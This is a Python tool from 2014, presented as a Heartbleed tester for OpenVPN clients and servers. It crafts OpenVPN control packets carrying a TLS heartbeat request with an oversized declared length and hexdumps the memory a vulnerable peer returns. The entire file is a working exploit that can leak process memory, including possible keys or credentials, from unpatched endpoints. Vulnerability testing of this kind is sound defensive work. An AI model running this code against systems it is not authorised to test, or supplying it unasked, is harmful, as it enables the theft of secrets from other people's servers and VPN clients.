#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# OpenVPN heartbleed tester with support for HMAC Firewall and server mode
# Copyright (C) 2014 Johannes Weißl
#
# Based on the OpenVPN source code, Wireshark dumps, and the work of Stefan
# Agner, Jared Stafford and Yonathan Klijnsma, but rewritten.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

from __future__ import print_function

import sys
import socket
import struct
import random
import time
import re
import binascii
import hmac
import hashlib
import calendar
import argparse

P_CONTROL_V1 = 4
P_ACK_V1 = 5
P_CONTROL_HARD_RESET_CLIENT_V2 = 7
P_CONTROL_HARD_RESET_SERVER_V2 = 8

TLS_VERSION_1_0 = (3, 1)
TLS_HEARTBEAT = 24

HB_REQUEST = 1
HB_RESPONSE = 2

def generate_hexdump(s, l=16):
    lh = l / 2
    def fmt_bytes(j):
        r = ['{:02x}'.format(ord(c)) for c in j]
        ps = (r[:lh], r[lh:])
        return '  '.join(' '.join(p) for p in ps)
    def fmt_offset(o):
        return '{:08x}'.format(o)
    hexbytes_len = len(fmt_bytes('0' * l))
    offset = 0
    for i in range(0, len(s), l):
        junk = s[i:i+l]
        hexbytes = '{:{len}s}'.format(fmt_bytes(junk), len=hexbytes_len)
        text = ''.join(c if 0x20 <= ord(c) < 0x7f else '.' for c in junk)
        yield '  '.join((fmt_offset(offset), hexbytes, '|{}|'.format(text)))
        offset += len(junk)
    if len(s) > 0:
        yield fmt_offset(offset)

def output_hexdump(s):
    for line in generate_hexdump(s):
        print(line)

def cur_net_time():
    return calendar.timegm(time.gmtime())

class OpenVPNMessage(object):
    def __init__(self, opcode=None, key_id=None, session_id=None,
                 packet_id=None, net_time=None, message_acks=None,
                 remote_session_id=None, message_packet_id=None,
                 payload=None, use_digest=False):
        self.opcode = opcode
        self.key_id = key_id
        self.session_id = session_id
        self.packet_id = packet_id
        self.net_time = cur_net_time() if net_time is None else net_time
        self.message_acks = [] if message_acks is None else message_acks
        self.remote_session_id = remote_session_id
        self.message_packet_id = message_packet_id
        self.payload = payload
        self.use_digest = use_digest
        self.digest = None
    def __repr__(self):
        fmt = 'OpenVPNMessage(opcode=%r, key_id=%r, session_id=%r'
        args = [self.opcode, self.key_id, self.session_id]
        if self.use_digest:
            fmt += ', packet_id=%r, net_time=%r'
            args += [self.packet_id, self.net_time]
        if len(self.message_acks) > 0:
            fmt += ', message_acks=%r, remote_session_id=%r'
            args += [self.message_acks, self.remote_session_id]
        if self.message_packet_id is not None:
            fmt += ', message_packet_id=%r'
            args += [self.message_packet_id]
        if self.payload is not None:
            fmt += ', payload=%r'
            args += [self.payload]
        fmt += ')'
        return fmt % tuple(args)
    def typ(self):
        return (self.opcode << 3) | self.key_id
    def pack(self):
        len_message_acks = len(self.message_acks)
        if self.use_digest:
            fmt = '>BQIIB'
            args = [self.typ(), self.session_id, self.packet_id,
                    self.net_time, len_message_acks]
        else:
            fmt = '>BQB'
            args = [self.typ(), self.session_id, len_message_acks]
        if len_message_acks > 0:
            fmt += '{}IQ'.format(len_message_acks)
            args += self.message_acks + [self.remote_session_id]
        if self.message_packet_id is not None:
            fmt += 'I'
            args += [self.message_packet_id]
        if self.payload is not None:
            fmt += '{}s'.format(len(self.payload))
            args += [self.payload]
        return struct.pack(fmt, *args)
    def unpack(self, buf):
        if self.use_digest:
            s_base = struct.Struct('>BQ20sIIB')
            typ, self.session_id, self.digest, self.packet_id, \
                self.net_time, len_message_acks = s_base.unpack_from(buf)
        else:
            s_base = struct.Struct('>BQB')
            typ, self.session_id, len_message_acks = s_base.unpack_from(buf)
        offset = s_base.size
        self.opcode = typ >> 3
        self.key_id = typ & 0x07
        if len_message_acks > 0:
            s_message_acks = struct.Struct('>{}I'.format(len_message_acks))
            self.message_acks = list(s_message_acks.unpack_from(buf, offset))
            offset += s_message_acks.size
            s_rsessid = struct.Struct('>Q')
            self.remote_session_id, = s_rsessid.unpack_from(buf, offset)
            offset += s_rsessid.size
        if self.opcode != P_ACK_V1:
            s_msgpktid = struct.Struct('>I')
            self.message_packet_id, = s_msgpktid.unpack_from(buf, offset)
            offset += s_msgpktid.size
        self.payload = buf[offset:]
        return self

def extract_hmac_key(f, direction=0):
    data = f.read()
    head = '-----BEGIN OpenVPN Static key V1-----'
    foot = '-----END OpenVPN Static key V1-----'
    m = re.match('.*?%s(.*?)%s' % (head, foot), data, re.DOTALL)
    if m is None:
        return hashlib.sha1(data).digest()
    s = re.sub(r'\s+', '', m.group(1))
    b = binascii.unhexlify(s)
    return [b[64:128], b[192:256]][direction][:20]

class OpenVPNSocket(object):
    def __init__(self, args):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s.settimeout(args.connect_timeout)
        self.remote = args.remote
        self.learned_remote = self.remote
        self.key_id = 0
        self.packet_id = 1
        self.message_packet_id = 0
        self.session_id = random.getrandbits(64)
        self.hmac_key = None
        if args.tls_auth is not None:
            self.hmac_key = extract_hmac_key(*args.tls_auth)
        self.use_digest = self.hmac_key is not None
        self.acks_recv = set()
        self.acks_sent = set()
        self.verb = args.verb

    def connect(self, address):
        self.s.connect(address)
        self.send_message(P_CONTROL_HARD_RESET_CLIENT_V2)
        return self.handle_message()

    def bind(self, port):
        self.s.bind(('', port))

    def send_message(self, opcode):
        msg = self.msg(opcode, message_packet_id=self.message_packet_id)
        self.send_msg(msg)
        self.message_packet_id += 1

    def send_message_with_payload(self, opcode, data):
        start = 0
        length = 0
        bytes_remaining = len(data)
        while bytes_remaining > 0:
            length = min(0x64, bytes_remaining)
            msg = self.msg(
                opcode, message_packet_id=self.message_packet_id,
                payload=data[start:start+length]
            )
            self.send_msg(msg)
            self.message_packet_id += 1
            bytes_remaining -= length
            start += length

    def msg(self, opcode, message_acks=None, remote_session_id=None,
             message_packet_id=None, payload=None):
        return OpenVPNMessage(
            opcode, self.key_id, self.session_id, self.packet_id,
            cur_net_time(), message_acks, remote_session_id,
            message_packet_id, payload, self.use_digest
        )

    def handle_message(self):
        data, addr = self.s.recvfrom(1024)
        if self.learned_remote is None:
            self.learned_remote = addr
        msg = OpenVPNMessage(use_digest=self.use_digest).unpack(data)
        if self.verb >= 6:
            print('recv', msg)
        self.acks_recv |= set(msg.message_acks)
        if msg.opcode == P_CONTROL_HARD_RESET_CLIENT_V2:
            ack = self.msg(
                P_CONTROL_HARD_RESET_SERVER_V2, [msg.message_packet_id],
                msg.session_id, self.message_packet_id)
            self.send_msg(ack)
            self.message_packet_id += 1
            self.acks_sent |= set([msg.message_packet_id])
        elif msg.opcode == P_CONTROL_HARD_RESET_SERVER_V2 and self.remote is None:
            ack = self.msg(
                P_CONTROL_HARD_RESET_CLIENT_V2, [msg.message_packet_id],
                msg.session_id, self.message_packet_id)
            self.send_msg(ack)
            self.message_packet_id += 1
            self.acks_sent |= set([msg.message_packet_id])
        elif msg.message_packet_id is not None:
            ack = self.msg(P_ACK_V1, [msg.message_packet_id], msg.session_id)
            self.send_msg(ack)
            self.acks_sent |= set([msg.message_packet_id])
        return msg

    def send_msg(self, msg):
        if self.verb >= 6:
            print('sent', msg)
        self.send_buf(msg.pack())

    def send_buf(self, buf):
        hbuf = buf[9:17] + buf[0:9] + buf[17:]
        if self.use_digest:
            digest = hmac.new(
                self.hmac_key, hbuf, digestmod=hashlib.sha1).digest()
            buf = buf[0:9] + digest + buf[9:]
        if self.learned_remote is None:
            self.s.send(buf)
        else:
            self.s.sendto(buf, self.learned_remote)
        self.packet_id += 1

class TLSProtocolVersion(object):
    fmt = '>BB'
    def __init__(self, major=None, minor=None):
        version = major if isinstance(major, tuple) else (major, minor)
        self.major = version[0]
        self.minor = version[1]
        self.s = struct.Struct(self.fmt)
    def version(self):
        return (self.major, self.minor)
    def __repr__(self):
        return 'TLSProtocolVersion(major=%r, minor=%r)' % \
            (self.major, self.minor)
    def __str__(self):
        return '%s' % (self.version(),)
    def pack(self):
        return self.s.pack(self.major, self.minor)
    def unpack(self, buf):
        self.major, self.minor = self.s.unpack(buf)
        return self

class TLSPlaintext(object):
    hdrfmt = '>B{}sH'.format(struct.calcsize(TLSProtocolVersion.fmt))
    def __init__(self, typ=None, version=None, payload=None):
        self.typ = typ
        self.version = version
        self.payload = payload
        self.length = None if payload is None else len(payload)
    def __repr__(self):
        return 'TLSPlaintext(typ=%r, version=%r, length=%r, payload=%r)' % \
            (self.typ, self.version, self.length, self.payload)
    def __str__(self):
        return 'TLSPlaintext(typ=%s, version=%s, length=%s, payload=%r)' % \
            (self.typ, self.version, self.length, self.payload[:5] + '...')
    def pack(self):
        fmt = '{}{}s'.format(self.hdrfmt, len(self.payload))
        return struct.pack(
            fmt, self.typ, self.version.pack(),
            self.length, self.payload
        )
    def unpack(self, buf):
        s = struct.Struct(self.hdrfmt)
        self.typ, version_buf, self.length = s.unpack(buf[:s.size])
        self.version = TLSProtocolVersion().unpack(version_buf)
        self.payload = buf[s.size:s.size+self.length]
        return self

class TLSHeartbeatMessage(object):
    hdrfmt = '>BH'
    def __init__(self, typ=None, payload=None, length=None):
        self.typ = typ
        self.payload = payload
        self.length = length
    def __repr__(self):
        return 'TLSHeartbeatMessage(typ=%r, length=%r, payload=%r)' % \
            (self.typ, self.length, self.payload)
    def __str__(self):
        return 'TLSHeartbeatMessage(typ=%s, length=%s, payload=%r)' % \
            (self.typ, self.length, self.payload[:5] + '...')
    def pack(self):
        fmt = '{}{}s'.format(self.hdrfmt, len(self.payload))
        return struct.pack(fmt, self.typ, self.length, self.payload)
    def unpack(self, buf):
        s = struct.Struct(self.hdrfmt)
        self.typ, self.length = s.unpack(buf[:s.size])
        self.payload = buf[s.size:s.size+self.length]
        return self

class RawMetavarFormatter(argparse.HelpFormatter):
    def _format_args(self, action, default_metavar):
        get_metavar = self._metavar_formatter(action, default_metavar)
        return '%s' % get_metavar(1)

def store_range(nmin, nmax):
    class StoreRange(argparse.Action):
        def __call__(self, parser, namespace, values, option_string=None):
            if not nmin <= len(values) <= nmax:
                msg = 'expected %d-%d arguments' % (nmin, nmax)
                raise argparse.ArgumentError(self, msg)
            setattr(namespace, self.dest, values)
    return StoreRange

def parse_args(args):
    parser = argparse.ArgumentParser(
        description='Test OpenVPN clients/servers for Heartbleed',
        formatter_class=RawMetavarFormatter
    )
    parser.add_argument('--remote', action=store_range(1, 2), nargs='+',
        metavar='host [port]', help='remote host name or IP address')
    parser.add_argument('--port', type=int, default=1194,
        help='port number for both local and remote ' \
             '(default: %(default)s)')
    parser.add_argument('--tls-auth', action=store_range(1, 2), nargs='+',
        metavar='file [direction]',
        help='enable HMAC firewall, see OpenVPN man page')
    parser.add_argument('--connect-timeout', type=float, default=10,
        metavar='N', help='connection timeout in seconds ' \
                         '(default: %(default)s)')
    parser.add_argument('-L', '--payload-length', type=int,
        default=0x1000, metavar='N',
        help='heartbeat request payload length (default: %(default)s)')
    parser.add_argument('-H', '--hexdump-length', type=int,
        default=0x40, metavar='N',
        help='length of hexdump to show (default: %(default)s)')
    parser.add_argument('--verb', type=int, default=1, metavar='N',
        help='output verbosity (default: %(default)s)')
    args = parser.parse_args(args)
    if args.remote is not None:
        remote_host = args.remote[0]
        remote_port = \
            args.port if len(args.remote) < 2 else int(args.remote[1])
        args.remote = (remote_host, remote_port)
    if args.tls_auth is not None:
        try:
            args.tls_auth[0] = argparse.FileType()(args.tls_auth[0])
        except argparse.ArgumentTypeError as e:
            parser.error('argument --tls-auth: %s' % e)
        if len(args.tls_auth) == 2:
            try:
                args.tls_auth[1] = int(args.tls_auth[1])
            except (TypeError, ValueError):
                parser.error('argument --tls-auth: invalid int ' \
                             'value: %r' % (args.tls_auth[1],))
    return args

def main(args=None):
    args = parse_args(args)
    vs = OpenVPNSocket(args)
    if args.remote is None:
        vs.bind(args.port)
        vs.handle_message()
        vs.handle_message()
    else:
        try:
            vs.connect(args.remote)
        except (socket.error,socket.herror,
                socket.gaierror,socket.timeout) as e:
            print('cannot connect to %s, port %d: %s' % \
                    (args.remote[0], args.remote[1], e), file=sys.stderr)
            return 1

    example_payload = b'Heartbleed example payload'
    hb_len_sent = args.payload_length
    hb_request = TLSHeartbeatMessage(HB_REQUEST, example_payload, hb_len_sent)
    if args.verb >= 4:
        print('sent', hb_request)
    tls_request = TLSPlaintext(
        TLS_HEARTBEAT, TLSProtocolVersion(TLS_VERSION_1_0), hb_request.pack())
    if args.verb >= 5:
        print('sent', tls_request)
    vs.send_message_with_payload(P_CONTROL_V1, tls_request.pack())

    payload = ''
    vulnerable = False
    ack_recv = False
    while True:
        msg = vs.handle_message()
        if msg.opcode == P_CONTROL_V1:
            payload += msg.payload
            tls_reponse = TLSPlaintext().unpack(payload)
            if args.verb >= 5:
                print('recv', tls_reponse)
            hb_response = TLSHeartbeatMessage().unpack(tls_reponse.payload)
            if args.verb >= 4:
                print('recv', hb_response)
            hb_len_recv = len(hb_response.payload)
            if tls_reponse.typ == TLS_HEARTBEAT and \
                    hb_response.typ == HB_RESPONSE and hb_len_recv > 0:
                vulnerable = True
                if hb_len_recv >= hb_len_sent:
                    break
            else:
                break
        elif msg.opcode == P_ACK_V1:
            ack_recv = True
            break
        else:
            break

    if args.verb >= 1:
        if vulnerable:
            print('VULNERABLE')
        elif ack_recv:
            print('NOT VULNERABLE (ONLY ACK RECEIVED)')
        else:
            print('NOT VULNERABLE')
    if vulnerable and args.verb >= 1:
        hexdump_length = min(hb_len_recv, args.hexdump_length)
        print()
        print('Hexdump of returned payload (%d of %d bytes):' % \
            (hexdump_length, hb_len_recv))
        output_hexdump(hb_response.payload[:hexdump_length])

    return 0xb if vulnerable else 0

if __name__ == '__main__':
    sys.exit(main())
